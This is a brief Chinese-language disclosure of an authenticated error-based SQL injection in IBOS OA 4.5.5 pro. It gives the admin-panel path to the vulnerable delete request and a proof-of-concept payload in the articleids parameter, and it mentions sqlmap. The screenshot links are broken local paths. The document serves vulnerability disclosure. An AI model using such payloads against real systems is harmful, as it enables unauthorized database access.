ibos oa v4.5.5存在SQL注入漏洞

官方网站： http: [//www.ibos.com.cn/](http://www.ibos.com.cn/)

版本：4.5.5 pro

登录后台。综合办公=>信息公告=>发布信息=>删除信息=>删除日志抓包 报错注入成功

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps6.jpg) 

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps7.jpg) 

 

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps8.jpg) 

Payload：articleids=extractvalue(1,concat(char(126),md5(1404461947)))

Sqlmap：

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9632\wps9.jpg)